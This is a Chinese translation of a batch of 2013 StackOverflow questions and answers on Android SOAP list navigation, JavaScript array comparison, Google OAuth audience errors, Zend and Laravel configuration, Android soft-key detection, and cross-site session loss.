# StackOverflow 问答 14853000-14853999

# android - 如何使用 android 中的 Web 服务从 ListView 获取子文件夹？

> ID：14853007
> 
> 赞同：-3
> 
> 时间：2013-02-13T11:56:20.437
> 
> 标签：android, web-services, android-listview, android-ksoap2

嗨，我正在尝试从 listview 获取子文件夹，我正在从 Web 服务获取列表，但是请任何人告诉我在单击 ItemClick 侦听器后如何获取子文件夹？我正在使用 .net 网络服务。

```
 public class LoginActivity extends Activity {

Button login;
TextView tv,result;
EditText user;
EditText pass;

 String Username,Password;
 private static final String NAMESPACE = "http://tempuri.org/";
 private static final String URL = "http://192.168.1.5/InterLogicsMobile/InterLogics.asmx";

 private static final String SOAP_ACTION = "http://tempuri.org/CheckLogin";
 private static final String LoginMethod = "CheckLogin";

 String LoginResponse;
@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
    StrictMode.setThreadPolicy(policy);
    setContentView(R.layout.login_activity);

    login = (Button) findViewById(R.id.btnLogin);
    tv = (TextView) findViewById(R.id.forget);

    tv.setOnClickListener(new View.OnClickListener() {
        public void onClick(View v) {

            Intent i = new Intent(getApplicationContext(),ForgetActivity.class);
            startActivity(i);

        }

    });

    login.setOnClickListener(new View.OnClickListener() {

        public void onClick(View v) {
            try{

                user=(EditText) findViewById(R.id.username);
                pass=(EditText) findViewById(R.id.password);

                Username= user.getText().toString();
                Password= pass.getText().toString();

            result = (TextView)findViewById(R.id.result);
            SoapObject request = new SoapObject(NAMESPACE, LoginMethod);

            request.addProperty("UserName", Username);
            request.addProperty("Password", Password);

            SoapSerializationEnvelope envelope = new SoapSerializationEnvelope(SoapEnvelope.VER11);
            envelope.dotNet = true;
            envelope.setOutputSoapObject(request);

            Log.i("LoginDetail", "Username " + Username + "Password " + Password);

            HttpTransportSE androidHttpTransport = new HttpTransportSE(URL);
            androidHttpTransport.debug = true;
            androidHttpTransport.call(SOAP_ACTION, envelope);

            SoapPrimitive response = (SoapPrimitive)envelope.getResponse();

                Log.i("myLogin", response.toString());
                System.out.println(response);

                LoginResponse = response.toString();

                if(LoginResponse==response.toString())
                {

                 Intent intent = new Intent(LoginActivity.this, Login.class);
                    startActivity(intent);

                }
                 else  
                {

                 Toast.makeText(LoginActivity.this, "Please check your Username and Password" , Toast.LENGTH_SHORT).show();

                }
            }

           catch (Exception e) {

            e.printStackTrace();
               Toast.makeText(getApplicationContext(), " Network Exception : " + e
                               + "Please check network connectivity.", Toast.LENGTH_LONG).show();
           } 
            }
        });
} 
```

## }

```
And 2nd Activity
public class Login extends Activity implements OnItemClickListener {

 private ListView datalist;

 private static final String NAMESPACE = "http://tempuri.org/";
 private static final String URL = "http://192.168.1.5/InterLogicsMobile/InterLogics.asmx";
 private static final String SOAP_ACTION = "http://tempuri.org/TreeData";
 private static final String TreeDataMethod = "TreeData";

 private String[] list;
 ArrayList<String> folderList;
// private ArrayList<Item> items;
 String subfolder_id;

 private void TreeData() throws NullPointerException{

     try {
        SoapObject request = new SoapObject(NAMESPACE, TreeDataMethod);
        request.addProperty("UserID",1);
        request.addProperty("FolderID",13002);

        SoapSerializationEnvelope envelope = new SoapSerializationEnvelope(SoapEnvelope.VER11);
        envelope.dotNet = true;  

        envelope.setOutputSoapObject(request);

        HttpTransportSE androidHttpTransport = new HttpTransportSE(URL);
        androidHttpTransport.debug = true;

        androidHttpTransport.call(SOAP_ACTION, envelope);
        SoapObject response = (SoapObject)envelope.getResponse();

        System.out.print(response);
        list = new String[response.getPropertyCount()];
        Log.i("myList", response.toString());
        for(int i=0;i< response.getPropertyCount();i++){ 

           list[i] = response.getPropertyAsString(i).toString();
           Log.i("myData", response.toString());
           datalist = (ListView) findViewById(R.id.first_list);
           ArrayAdapter<String> adapter = new ArrayAdapter<String>(this,android.R.layout.simple_list_item_1, list);
           datalist.setAdapter(adapter);
           datalist.setOnItemClickListener(this);
      }      
} 
        catch (Exception e) {           
            e.printStackTrace();
            Toast.makeText(getApplicationContext(), " NullPointerException " + e
                    + "Do Something", Toast.LENGTH_LONG).show();

        }finally{

        }
    }

@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.login);
    TreeData();
}
public void onItemClick(AdapterView<?> arg0, View arg1, int arg2, long arg3) {
    Intent intent = new Intent(Login.this,TreeDataActivity.class);

    String subfolder_id = ((TextView) arg1.findViewById(R.id.subfolder_id)).getText().toString();
    intent.putExtra("subfolder_id", subfolder_id);
    startActivity(intent);
} 
```

}

单击项目后单击没有得到任何进一步的列表。这是我的第三个活动

```
public class TreeDataActivity extends Activity {

 private ListView mylist;

 private static final String NAMESPACE = "http://tempuri.org/";
 private static final String URL = "http://192.168.1.5/InterLogicsMobile      
 /InterLogics.asmx";
 private static final String SOAP_ACTION = "http://tempuri.org/TreeDataSubFolder";
 private static final String TreeDataSubMethod = "TreeDataSubFolder";

 private String[] list;

 private void TreeDataSubFolder(){

     try {
        SoapObject request = new SoapObject(NAMESPACE, TreeDataSubMethod);

        request.addProperty("FolderID",13002);
        request.addProperty("UserID", 1);

        SoapSerializationEnvelope envelope = new SoapSerializationEnvelope(SoapEnvelope.VER11);
        envelope.dotNet = true;  

        envelope.setOutputSoapObject(request);

        HttpTransportSE androidHttpTransport = new HttpTransportSE(URL);
        androidHttpTransport.debug = true;

        androidHttpTransport.call(SOAP_ACTION, envelope);
        SoapObject response = (SoapObject)envelope.getResponse();

        System.out.print(response);
        list = new String[response.getPropertyCount()];
        for(int i=0;i< response.getPropertyCount();i++){ 

           list[i] = response.getPropertyAsString(i).toString();

           Log.i("myData", response.toString());
           mylist = (ListView) findViewById(R.id.mylist);
           ArrayAdapter<String> adapter = new ArrayAdapter<String>(this,android.R.layout.simple_list_item_1, list);
           mylist.setAdapter(adapter);

      }      
} 
        catch (Exception e) {           
            e.printStackTrace();
        }       
    }

@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.treesubdata);

    TreeDataSubFolder();
} 
```

}

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-28T11:55:02.727

```
enter code here

package com.example.dms;

import java.util.ArrayList;
import java.util.List;

 import org.ksoap2.SoapEnvelope;
 import org.ksoap2.serialization.SoapObject;
 import org.ksoap2.serialization.SoapPrimitive;
 import org.ksoap2.serialization.SoapSerializationEnvelope;
 import org.ksoap2.transport.HttpTransportSE;

 import android.app.Activity;
 import android.content.Intent;
 import android.os.Bundle;
 import android.os.StrictMode;
 import android.util.Log;
 import android.view.View;
 import android.widget.AdapterView;
 import android.widget.AdapterView.OnItemClickListener;
 import android.widget.ArrayAdapter;
 import android.widget.ListView;
 import android.widget.Toast;

 public class TreeDataActivity extends Activity implements OnItemClickListener {

 private ListView datalist;

 private static final String NAMESPACE = "http://tempuri.org/";
 private static final String URL =          "http://192.168.1.5/InterLogicsMobile/InterLogics.asmx";
 private static final String SOAP_ACTION = "http://tempuri.org/TreeData";
 private static final String TreeDataMethod = "TreeData";

 private String[] firstlist;
 String FolderID = null;
 String ID;
 String FolderName;
 String ParentID;
 String CreatedBy;
// List<IconSetter> rowItems;

// public static final Integer[] images = { R.drawable.folder_icon,};
 @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        setContentView(R.layout.treedata);
        TreeData();
    }
    public void onItemClick(AdapterView<?> arg0, View arg1, int arg2, long  arg3) {

        ID = (String) datalist.getItemAtPosition(arg2);
        //FolderName = (String) datalist.getItemAtPosition(arg2);

        Intent intent = new Intent(TreeDataActivity.this,TreeDataSubFolderActivity.class);
        intent.putExtra("ID",ID );
        //intent.putExtra("FolderName",FolderName );
        startActivity(intent);
    }

 private void TreeData() throws NullPointerException{

     try {
        SoapObject request = new SoapObject(NAMESPACE, TreeDataMethod);
        request.addProperty("UserID", 1);

        SoapSerializationEnvelope envelope = new SoapSerializationEnvelope(SoapEnvelope.VER11);
        envelope.dotNet = true;  

        envelope.setOutputSoapObject(request);

        HttpTransportSE androidHttpTransport = new HttpTransportSE(URL);
        androidHttpTransport.debug = true;

        androidHttpTransport.call(SOAP_ACTION, envelope);

        SoapObject list = (SoapObject)envelope.getResponse();

        System.out.print(list);

        firstlist = new String[list.getPropertyCount()];

        for(int i=0;i< list.getPropertyCount();i++){
             /*rowItems = new ArrayList<IconSetter>();
             IconSetter item = new IconSetter(images[0],FolderName[1],ID[2]); 

             rowItems.add(item);*/
             SoapObject result = (SoapObject)list.getProperty(i);

             ID = result.getProperty(0).toString();
             FolderName = result.getProperty(1).toString();
             ParentID = result.getProperty(2).toString();
             CreatedBy = result.getProperty(3).toString();

             System.out.println(ID);
             System.out.println(FolderName);
             System.out.println(ParentID);
             System.out.println(CreatedBy);

             SoapPrimitive Record =(SoapPrimitive) result.getProperty(1);

             Log.i("Record", Record.toString());

           firstlist[i] = result.getPropertyAsString(0).toString();
          // firstlist[i] = result.getPropertyAsString(1).toString();

           datalist = (ListView) findViewById(R.id.first_list);

           ArrayAdapter<String> adapter = new ArrayAdapter<String>(this,android.R.layout.simple_list_item_1, firstlist);

           datalist.setAdapter(adapter);

           datalist.setOnItemClickListener(this);
      }      
} 
        catch (Exception e) {           
            e.printStackTrace();
            Toast.makeText(getApplicationContext(), " NullPointerException " + e
                    + "Do Something", Toast.LENGTH_LONG).show();

        }finally{

        }
    }

} 
```

# javascript - 获取客户端 PC 计算机名称或 MAC 地址

> ID：14853009
> 
> 赞同：0
> 
> 时间：2013-02-13T11:56:31.247
> 
> 标签：javascript

我需要从浏览我的网站的客户端获取计算机名称或 Mac 地址

我从 1 个月前进行了一项研究，直到现在我找不到正确的代码，这很难还是可能！在 JavaScript 或 PHP 中？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T12:07:34.940

这篇文章解释了这在服务器端是不可能的，并且也给出了解释。 [如何从 HttpServlet 获取客户端的 MAC 地址？](https://stackoverflow.com/questions/839973/how-to-get-a-clients-mac-address-from-httpservlet)

客户端软件可能能够做到这一点，但只能通过技巧。从纯 JS 这肯定是不可能的。 [使用 Java 小程序在网页上获取 MAC 地址](https://stackoverflow.com/questions/4467905/getting-mac-address-on-a-web-page-using-a-java-applet)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-08-12T18:30:32.743

不，这是不可能的，您需要一些计算机网络知识才能理解原因。

为了能够跟踪每个客户端的 MAC 地址，您需要在链路层（或 OSI 第 2 层）与其交互。当您是客户端用作 Internet 访问点的路由器时，就会出现这种情况。不是当您只是托管客户端连接到的网站的服务器时。

但是，您的服务器与应用层交互。在这一层，您可以跟踪客户的 UA（用户代理），但这不会以独特的方式识别他们。

此外，人们可以在 MAC OSX 上更改他们的 Wifi MAC 地址 =>，运行命令“sudo ifconfig en0 lladdr 00:01:02:03:04:05”

有关计算机网络的良好介绍：[https ://class.stanford.edu/courses/Engineering/Networking/Winter2014/about](https://class.stanford.edu/courses/Engineering/Networking/Winter2014/about)

# android - 从组合字符串中读取字符串 帮助如何阅读

> ID：14853015
> 
> 赞同：0
> 
> 时间：2013-02-13T11:56:41.027
> 
> 标签：android, string

我想读这个字符串

```
 String  "abc;def;ghi;jklm;nopqr" 
```

我想得到这些不同的不同

```
 string a = abc;
  string b = def;
      string c = ghi;
     string f = nopqr;` 
```

我是怎么读到这个的，请帮助我，

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-13T11:59:17.323

您可以使用拆分方法：

```
String[] tokens = str.split(";") 
```

例如：

```
String myString = "abc;def;ghi;jklm;nopqr";
String[] tokens = myString.split(";")
//tokens[0]="abc"
//tokens[1]="def"
//... 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T12:02:06.737

试试这个：

```
String string = "aaa;bbb";
String[] parts = string.split(";");
String part1 = parts[0]; //aaa
String part2 = parts[1];//bbb 
```

# azure - 从 PC 连接到 Azure 虚拟网络

> ID：14853018
> 
> 赞同：1
> 
> 时间：2013-02-13T11:56:47.753
> 
> 标签：azure, cloud, azure-storage, vpn, azure-virtual-network

我们在 Azure 云中托管和协同工作的虚拟机、存储帐户和网站的虚拟网络。

是否可以使用某些 VPN 软件将我的工作/家庭 PC 连接到此虚拟网络？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-13T12:41:29.677

一般来说，存在两个选项，您可以[在此处](http://www.windowsazure.com/en-us/home/features/networking/)阅读这些选项 -

*   [Windows Azure Connect](http://msdn.microsoft.com/en-us/library/windowsazure/gg433122.aspx)让您可以配置机器对机器 VPN，并且是基于代理的
*   [配置专用网络可](http://www.windowsazure.com/en-us/manage/services/networking/cross-premises-connectivity/)让您创建站点到站点 VPN，但它通常[需要 VPN 设备](http://msdn.microsoft.com/en-us/library/windowsazure/jj156075.aspx)。我在互联网上看到过有关人们设法将其路由器配置为 VPN 网关的帖子，但至少在这一点上，这并不容易，也不支持。

另外值得一读的是David Chappel[对 Windows Azure 网络](http://www.windowsazure.com/en-us/develop/net/fundamentals/networking/#Connect)功能的概述，它涵盖了（和流量管理器）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T12:04:09.150

看看结合 Azure 虚拟机使用 Azure 虚拟网络：http: [//www.windowsazure.com/en-us/manage/services/networking/add-a-vm-to-a-virtual-network/](http://www.windowsazure.com/en-us/manage/services/networking/add-a-vm-to-a-virtual-network/)

# javascript - 像在 Python 中那样比较 Javascript 中的两个列表的最佳方法是什么？

> ID：14853019
> 
> 赞同：2
> 
> 时间：2013-02-13T11:56:48.457
> 
> 标签：javascript, python, optimization, coffeescript

我对 JavaScript 很陌生，但对 python 很熟悉。在 Python 中，我得到以下输出：

```
In [1]: [1,9,[5,4,2]] > [1,9,[14,5,4]]
Out[1]: False 
```

在 JavaScript 中：

```
> [1,9,[5,4,2]] > [1,9,[14,5,4]]
true 
```

似乎在比较之前将数组转换为字符串。

现在我想自己编写一个函数并遍历数组并比较每个元素。我想出了这个咖啡脚本代码：

```
compare_list = (a, b)->
    if typeof a == "object" and typeof b != "object"
        return 1
    else if typeof a != "object" and typeof b == "object"
        return -1
    else if typeof a != "object" and typeof b != "object"
        if a > b
            return 1
        else if a < b
            return -1
        else
            return 0
    else if typeof a == "object" and typeof b == "object"
        for i in [0...a.length]
            if i > (b.length-1)
                return 1
            tmp = compare_list a[i], b[i]
            if tmp != 0
                return tmp
        if b.length > a.length
            return -1
        return 0 
```

它以这种方式工作，但`typeof a == "object"`对我来说这部分看起来不正确。是否有更简单/更好/更强大的解决方案？

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-13T13:27:36.957

这基本上是相同的算法，避免了`typeof`运算符并在循环中做了一个小技巧，`for`每次都不检查数组的长度：

```
cmp = (a, b) -> (a > b) - (a < b)

cmpArray = (a, b)->
  aIsArray = Array.isArray a
  bIsArray = Array.isArray b

  return cmp a, b if not aIsArray and not bIsArray
  return -1       if not aIsArray and     bIsArray
  return 1        if     aIsArray and not bIsArray

  # Both are arrays.
  len = Math.min a.length, b.length
  for i in [0...len] by 1
    if tmp = cmpArray a[i], b[i]
      return tmp
  a.length - b.length 
```

不幸的是，CoffeeScript 不提供任何类型的模式匹配。这将使这段代码更加干燥。`switch`如果需要，您可以使用语句伪造穷人的模式匹配：

```
cmpArray = (a, b)->
  switch "#{Array.isArray a},#{Array.isArray b}"
    when 'false,false' then (a > b) - (a < b) # Compare primitives.
    when 'false,true' then -1
    when 'true,false' then 1
    else
      len = Math.min a.length, b.length
      for i in [0...len] by 1
        if tmp = cmpArray a[i], b[i]
          return tmp
      a.length - b.length 
```

但这绝对不是非常惯用的 CoffeeScript。如果 CoffeeScript 支持某种模式匹配，我肯定会选择这种解决方案，因为我认为它只是一个表达式，而不是（过多）依赖于早期返回，读起来非常好。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T12:12:59.760

试图解决同样的问题，我也只是想出了一个自定义的解决方案。[https://gist.github.com/ruxkor/2772234](https://gist.github.com/ruxkor/2772234)

由于Javascript在比较对象时使用字符串强制，我认为有必要使用自定义比较函数来模拟Python行为。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-13T13:24:11.320

让我们让它变得简约：

```
function compare(a, b) {
    if (a instanceof Array && b instanceof Array) {
        for (var r, i=0, l=Math.min(a.length, b.length); i<l; i++)
            if (r = compare(a[i], b[i]))
                return r;
        return a.length - b.length;
    } else // use native comparison algorithm, including ToPrimitive conversion
        return (a > b) - (a < b);
} 
```

（`instanceof`用于阵列检测，请参阅[本文](http://perfectionkills.com/instanceof-considered-harmful-or-how-to-write-a-robust-isarray/)讨论）

如果要使对象始终大于基元，可以将最后一行更改为

```
 return (typeof a==="object")-(typeof b==="object") || (a>b)-(a<b); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-02-13T13:37:54.077

我尝试实现一个 JavaScript 函数`compareArrays`，该函数的行为类似于 Python 中的数组比较：

```
function compareArrays(a, b) {
    var aIsArray = Array.isArray(a),
        bIsArray = Array.isArray(b),
        cmp = 0;
    if (!aIsArray || !bIsArray) {
        throw new Error('Can\'t compare array to non-array: ' + a + ', ' + b);
    }

    _.find(a, function (aElem, index) {
        var bElem = b[index];
        if (Array.isArray(aElem) || Array.isArray(bElem)) {
            cmp = compareArrays(aElem, bElem);
        } else {
            cmp = (aElem > bElem) - (aElem < bElem);
        }

        if (cmp !== 0) {
            return true;
        }
    });

    return cmp;
} 
```

它使用[下划线](http://underscorejs.org/)遍历数组，并递归处理嵌套数组。

请参阅我的[小提琴](http://jsfiddle.net/aknuds1/zQtfa/)，其中包括一个原始测试套件。

## 测试结果

```
[1,9,[5,4,2]] < [1,9,[14,5,4]]
[1,[1]] can't be compared to [1,1]
[1,[2]] > [1,[1]]
[2] > [1]
[1] == [1]
[] == [] 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-02-13T12:53:16.723

这很丑陋，但这似乎可以完成工作：

```
var compareLists = function compare(listA, listB) {
    if (Array.isArray(listA)) {
        if (Array.isArray(listB)) {
            if (listA.length == 0) {
                if (listB.length == 0) {
                    return 0;
                } else {
                    return -1;
                }
            } else {
                if (listB.length == 0) {
                    return +1;
                } else {
                    return compare(listA[0], listB[0]) || 
                           compare(listA.slice(1), listB.slice(1));
                }
            }
        } else {
            return -1; // arbitrary decision: arrays are smaller than scalars
        }
    } else {
        if (Array.isArray(listB)) {
            return +1; // arbitrary decision: scalars are larger than arrays
        } else {
            return listA < listB ?  -1 : listA > listB ? + 1 : 0;
        }
    }
};

compareLists([1, 9, [5, 4, 2]], [1, 9, [14, 5, 4]]); // -1
compareLists([1, 9, [5, 4, 2]], [1, 9, [5, 4]]);     // +1
compareLists([1, 9, [5, 4, 2]], [1, 9, [5, 4, 2]]);  //  0 
```

根据您的环境，您可能需要填充`Array.isArray`：

```
if (!Array.isArray) {
    Array.isArray = function (obj) {
        return Object.prototype.toString.call(obj) === "[object Array]";
    };
} 
```

# php - CodeIgniter HMVC：与其他模块通信的正确方式？

> ID：14853028
> 
> 赞同：0
> 
> 时间：2013-02-13T11:57:10.873
> 
> 标签：php, codeigniter, hmvc

假设我有 2 个模块：A 和 B。

如果我想从模块 A 调用模块 B 的模型之一中的函数，正确的方法是什么？

模块之间的通信应该只发生在控制器之间，还是我可以直接从模块 B 以控制器形式模块 A 调用模型？

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T12:03:21.917

请按照以下步骤操作

```
1) load model of B from A module like $this->load->model("b_model");

2) if your function name is user then call like this $this->b_model->user(); 
```

# android - 请求 id_token 时的 Google oauth INVALID_AUDIENCE

> ID：14853029
> 
> 赞同：2
> 
> 时间：2013-02-13T11:57:12.710
> 
> 标签：android, google-oauth

我在我的 android 应用程序中实现了[http://android-developers.blogspot.fi/2013/01/verifying-back-end-calls-from-android.html 。](http://android-developers.blogspot.fi/2013/01/verifying-back-end-calls-from-android.html)我在我们的 google api 项目的开发版本中为应用程序添加了一个客户端 ID，并使 android 应用程序请求 id_token

```
idToken = GoogleAuthUtil.getToken(AuthenticatorActivity.this, accountName, "audience:server:client_id:1234567890.apps.googleusercontent.com"); 
```

所有这一切都非常完美。然后我想测试它是否在生产中工作。我在生产版 google api 项目中添加了一个客户端 ID，在代码中使用它并重建了生产版应用程序。从那以后我总是得到

```
GLS error: INVALID_AUDIENCE <Removed>@gmail.com audience:server:client_id:1234567890.apps.googleusercontent.com 
```

作为响应和具有相同消息的 GoogleAuthException。

我试图一次删除并重新创建一个客户端 ID（所以我只使用昨天的开发客户端 ID 和未修改的代码进行测试，结果相同。），我检查了创建客户端 ID 时我是否真的使用了正确的 SHA1，我已经重建了两个版本的应用程序并使用多个设备和谷歌帐户进行了测试。

我是否通过向两个项目添加具有相同 android 包名称的 client_id 来破坏 google api 项目服务器，还是只是我忽略了一些东西？

编辑：似乎我真的破坏了一些东西，因为在第三个项目中创建一个新的客户端 ID 使我能够再次获取 id_token 而无需更改代码。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-18T04:24:43.333

Google 处理新创建的 client_ids 时存在一个错误（已修复）（它不影响实时应用，仅影响新注册的应用）。你最近几天再试一次吗？

# zend-framework - Zend 中的帐户确认身份验证失败

> ID：14853032
> 
> 赞同：0
> 
> 时间：2013-02-13T11:57:36.337
> 
> 标签：zend-framework

我被这个问题困住了。在我的 zend 应用程序中对登录凭据进行身份验证时，我还想检查该帐户是否已被确认。Confirmed 是我的帐户表中的一个布尔列，默认设置为 False。我正在尝试通过以下代码来实现这一点..但它不起作用

```
 $db = Zend_Db_Table::getDefaultAdapter();
    $authAdapter = new Zend_Auth_Adapter_DbTable($db);
    $authAdapter->setTableName('Account');
    $authAdapter->setIdentityColumn('Email');
    $authAdapter->setCredentialColumn('Password');
    $authAdapter->setCredentialTreatment('Confirmed = 1');
    $authAdapter->setIdentity($data['email']);
    $authAdapter->setCredential($data['password']);
    $auth = Zend_Auth::getInstance();
    $result = $auth->authenticate($authAdapter);

    if ($result->isValid()) {
        if ($data['public'] == "1") {
            Zend_Session::rememberMe(Zend_Registry::getInstance()->constants->sessiontime);
        } else {
            Zend_Session::forgetMe();
        }
        return TRUE;
    } else {
        return FALSE;
    } 
```

尽管该帐户未确认身份验证通过。请告诉我我哪里错了

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T13:32:12.103

凭据处理参数指定应如何检查密码。您可以覆盖它以添加其他子句，但您仍然需要包含密码位。真的，我没想到您的方法可以验证任何用户，所以这可能不是主要问题，但请尝试：

```
$authAdapter->setCredentialTreatment('MD5(?) AND Confirmed = 1'); 
```

更改 MD5 位，但您的密码已加密。这应该会生成一个查询，如下所示：

```
... WHERE Email = 'xxx' AND Password = MD5(?) AND Confirmed = 1 
```

# asp.net-mvc - 在类库项目中渲染视图

> ID：14853034
> 
> 赞同：0
> 
> 时间：2013-02-13T11:57:41.227
> 
> 标签：asp.net-mvc

我在文件夹中有一个视图，`Views`并且我有一个类库项目。在这个项目中，我想将视图呈现为字符串。

```
public class DumpService
{
     public void Method()
     {
         var renderedView = SomeMethodForRenderingView();
     }
} 
```

我找到了一些答案，但是使用了我在类库项目中没有的控制器上下文。
我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T12:07:33.713

您需要阅读视图文本 - 只需打开它并阅读文本，然后使用 解析它：

```
Razor.Parse 
```

# php - 如何使用 Laravel 3 创建新的缓存驱动程序？

> ID：14853037
> 
> 赞同：0
> 
> 时间：2013-02-13T11:57:56.700
> 
> 标签：php, caching, laravel, laravel-3

我在 application/libraries/fnmemcache.php 中创建了一个新文件，其中包含：

```
namespace Laravel\Cache\Drivers;
class FNMemcache extends Sectionable {
   // ...
} 
```

当我在 cache.php 配置文件中设置“fnmemcache”驱动程序时，它没有检测到我的新缓存驱动程序。我也尝试过`Cache::extend()`start.php 中的方法，但它是一样的。

查看 laravel 目录中的 cache.php 文件（工厂方法），它似乎永远不会工作，因为它有一个带有预定义缓存驱动程序的开关，如果我们不指定其中一个，则会引发异常。这将很容易修改核心，但我当然不想这样做。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-11T13:00:09.767

首先，如果您的驱动程序位于`application/libraries`您不应该在`Laravel\Cache\Drivers`. 所以你应该有`class FNMemcache extends Laravel\Cache\Drivers\Sectionable`。

你提到了`Cache::extend()`方法，这是你需要挂钩的。看看[这条线](https://github.com/laravel/laravel/blob/master/laravel/cache.php#L55)，看看它如何首先检查任何现有的注册商？这是您注册自己的驱动程序的方式。

该[`Cache::extend()`](https://github.com/laravel/laravel/blob/master/laravel/cache.php#L97)方法实际上添加了您的驱动程序。您的闭包应该返回您的驱动程序的一个实例。

```
Cache::extend('fnmemcache', function()
{
    return new FNMemcache;
}); 
```

然后您可以设置配置，或在运行时使用驱动程序。

```
Cache::driver('fnmemcache')->set('key', 'value'); 
```

# android - 如何判断安卓设备是否有硬键

> ID：14853039
> 
> 赞同：14
> 
> 时间：2013-02-13T11:58:00.450
> 
> 标签：android

如何判断安卓设备是否有物理按键或软件导航栏？我需要根据是否绘制软件导航来更改布局。

例如 HTC Desire C 有硬件键： ![在此处输入图像描述](../Images/6bf97479851d9cf94ee7ee729e3c4d77.png)

我应该澄清一下 - 我在看导航栏，而不是键盘。回家，回来等。我试过了：

```
 getResources().getConfiguration().keyboard);
        getResources().getConfiguration().navigation);
        getResources().getConfiguration().navigationHidden); 
```

在两个设备上返回相同的值。

* * *

## 回答 #1

> 赞同：55
> 
> 时间：2013-02-14T09:50:37.003

通过在第一次启动应用程序并保存到首选项时执行此操作来解决：

```
public static boolean hasSoftKeys(WindowManager windowManager){
    boolean hasSoftwareKeys = true;
    //c = context; use getContext(); in fragments, and in activities you can 
    //directly access the windowManager();

    if(Build.VERSION.SDK_INT>=Build.VERSION_CODES.JELLY_BEAN_MR1){
        Display d = c.getWindowManager().getDefaultDisplay();

        DisplayMetrics realDisplayMetrics = new DisplayMetrics();
        d.getRealMetrics(realDisplayMetrics);

        int realHeight = realDisplayMetrics.heightPixels;
        int realWidth = realDisplayMetrics.widthPixels;

        DisplayMetrics displayMetrics = new DisplayMetrics();
        d.getMetrics(displayMetrics);

        int displayHeight = displayMetrics.heightPixels;
        int displayWidth = displayMetrics.widthPixels;

        hasSoftwareKeys =  (realWidth - displayWidth) > 0 ||
                           (realHeight - displayHeight) > 0;
    } else {
        boolean hasMenuKey = ViewConfiguration.get(c).hasPermanentMenuKey();
        boolean hasBackKey = KeyCharacterMap.deviceHasKey(KeyEvent.KEYCODE_BACK);
        hasSoftwareKeys = !hasMenuKey && !hasBackKey;
    }
    return hasSoftwareKeys;
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-08-02T11:04:21.357

给你..这应该做你想要的。

```
@SuppressLint("NewApi")
private static boolean hasSoftNavigation(Context context)
{
    if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.ICE_CREAM_SANDWICH){
        return !ViewConfiguration.get(context).hasPermanentMenuKey();
    }
    return false;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T12:00:42.477

`private boolean isHardwareKeyboardAvailable() { return getResources().getConfiguration().keyboard != Configuration.KEYBOARD_NOKEYS; }`

此外，这里有更多信息。[http://developer.android.com/reference/android/content/res/Configuration.html#keyboard](http://developer.android.com/reference/android/content/res/Configuration.html#keyboard)

编辑 - 检查物理键盘

`private boolean isPhysicalKeyboardAvailable() { return getResources().getConfiguration().keyboard == Configuration.KEYBOARD_QWERTY; }`

有关不同配置的更多信息，请查看 [http://developer.android.com/reference/android/content/res/Configuration.html#keyboard](http://developer.android.com/reference/android/content/res/Configuration.html#keyboard)

我确信其中之一是作品。

第二次编辑 -

查看。已经问过了。

[Android：以编程方式检测设备是否有硬件菜单按钮](https://stackoverflow.com/questions/9044907/android-programatically-detect-if-device-has-hardware-menu-button)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2021-05-04T14:46:26.820

基于@serenskye 的解决方案

```
private fun Activity.hasSoftKeys(): Boolean {
    val display = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
        display
    } else {
        windowManager.defaultDisplay
    } ?: return true

    val realDisplayMetrics = DisplayMetrics()
    display.getRealMetrics(realDisplayMetrics)

    val realHeight = realDisplayMetrics.heightPixels
    val realWidth = realDisplayMetrics.widthPixels

    val displayMetrics = DisplayMetrics()
    display.getMetrics(displayMetrics)

    val displayHeight = displayMetrics.heightPixels
    val displayWidth = displayMetrics.widthPixels

    return realWidth - displayWidth > 0 || realHeight - displayHeight > 0
} 
```

# php - CodeIgniter 和 Joomla - 会话数据丢失

> ID：14853040
> 
> 赞同：1
> 
> 时间：2013-02-13T11:58:02.803
> 
> 标签：php, codeigniter, session, joomla, browser

我在这里面临一个非常奇怪的问题。

我有两个网站：`**A** and **B**`

```
**A** is the landing page (a micro website). **A** is running Joomla.

**B** - payment pages. Coded with CodeIgniter. Uses session library and stores session data in a database. 
```

==================

**场景**：用户访问登录页面（网站**A**），选择服务包并点击购买。然后他被带到付款页面（网站**B**）并开始填写他的申请表。完成后，他将被带到支付网关（由 SecureTrading 提供）并进行支付。支付成功后，用户被带回网站**B**，他必须在那里完成他的应用程序的最后一点。

**问题**：付款成功后，用户被重定向回网站**B**，但由于某种原因，所有会话数据都丢失了。

**何时发生**：会话数据仅在用户来自登录页面 ( **A** ) 时丢失。如果我开始填写申请表而不首先访问登录页面，那么一切正常。

为什么会这样？我该如何解决？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T13:48:09.797

确保在您的`application/config.php`文件中将以下设置设置为此值：

```
$config['cookie_domain'] = ".mysite.com"; 
```

